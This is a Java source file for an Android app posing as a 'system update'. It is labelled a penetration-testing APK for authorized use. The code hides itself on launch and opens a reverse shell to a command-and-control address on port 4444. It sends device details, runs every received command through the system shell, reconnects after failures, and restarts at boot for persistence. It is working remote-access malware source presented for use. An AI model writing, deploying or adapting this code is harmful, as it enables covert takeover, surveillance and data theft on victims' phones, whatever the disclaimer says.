package com.android.system.update;

import android.app.Activity;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URLDecoder;

/**
 * REAL Android Penetration Testing APK
 * Authorized use only — ethical testing
 */
public class MainActivity extends Activity {
    
    private static final String TAG = "SysUpdate";
    private static String C2_HOST = "192.168.1.100";
    private static int C2_PORT = 4444;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide from user — move to background
        moveTaskToBack(true);
        
        // Start payload service
        Intent serviceIntent = new Intent(this, PayloadService.class);
        startForegroundService(serviceIntent);
        
        // Register boot receiver for persistence
        registerReceiver(new BootReceiver(), 
            new IntentFilter("android.intent.action.BOOT_COMPLETED"));
        
        finish(); // Close activity immediately
    }
    
    /**
     * REAL Reverse Shell Service — connects to C2
     */
    public static class PayloadService extends Service {
        
        private Thread payloadThread;
        private boolean running = true;
        
        @Override
        public void onCreate() {
            super.onCreate();
            Log.i(TAG, "Payload service starting...");
        }
        
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            // Start reverse shell in background thread
            payloadThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    connectAndExecute();
                }
            });
            payloadThread.setDaemon(true);
            payloadThread.start();
            
            return START_STICKY; // Auto-restart if killed
        }
        
        private void connectAndExecute() {
            Socket socket = null;
            DataOutputStream dos = null;
            BufferedReader reader = null;
            
            try {
                Log.i(TAG, "Connecting to C2: " + C2_HOST + ":" + C2_PORT);
                
                socket = new Socket();
                socket.connect(new InetSocketAddress(C2_HOST, C2_PORT), 10000);
                
                InputStream is = socket.getInputStream();
                OutputStream os = socket.getOutputStream();
                dos = new DataOutputStream(os);
                reader = new BufferedReader(new InputStreamReader(is));
                
                // Send device info on connect
                String deviceInfo = android.os.Build.MODEL + "|" + 
                                    android.os.Build.VERSION.RELEASE + "|" +
                                    android.os.Build.MANUFACTURER;
                dos.writeBytes(deviceInfo + "\n");
                dos.flush();
                
                // Command execution loop
                String command;
                while (running && (command = reader.readLine()) != null) {
                    if (command.equalsIgnoreCase("exit") || 
                        command.equalsIgnoreCase("quit")) {
                        break;
                    }
                    
                    String result = executeCommand(command);
                    dos.writeBytes(result + "\n");
                    dos.flush();
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
                // Auto-reconnect after delay
                try { Thread.sleep(30000); } catch (InterruptedException ie) {}
                connectAndExecute(); // Retry
            } finally {
                try {
                    if (dos != null) dos.close();
                    if (reader != null) reader.close();
                    if (socket != null) socket.close();
                } catch (Exception e) {}
            }
        }
        
        private String executeCommand(String cmd) {
            StringBuilder output = new StringBuilder();
            try {
                // Execute command via shell
                Process process = Runtime.getRuntime().exec(new String[]{
                    "/system/bin/sh", "-c", cmd
                });
                
                BufferedReader stdout = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
                BufferedReader stderr = new BufferedReader(
                    new InputStreamReader(process.getErrorStream()));
                
                String line;
                while ((line = stdout.readLine()) != null) {
                    output.append(line).append("\n");
                }
                while ((line = stderr.readLine()) != null) {
                    output.append("[ERR] ").append(line).append("\n");
                }
                
                process.waitFor();
                
            } catch (Exception e) {
                output.append("Error: ").append(e.getMessage());
            }
            return output.toString().trim();
        }
        
        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
        
        @Override
        public void onDestroy() {
            running = false;
            Log.i(TAG, "Payload service destroyed, will restart");
            // Service auto-restarts due to START_STICKY
        }
    }
    
    /**
     * Boot Receiver — maintains persistence
     */
    public static class BootReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                Log.i(TAG, "Boot received — restarting payload");
                Intent serviceIntent = new Intent(context, PayloadService.class);
                context.startForegroundService(serviceIntent);
            }
        }
    }
}
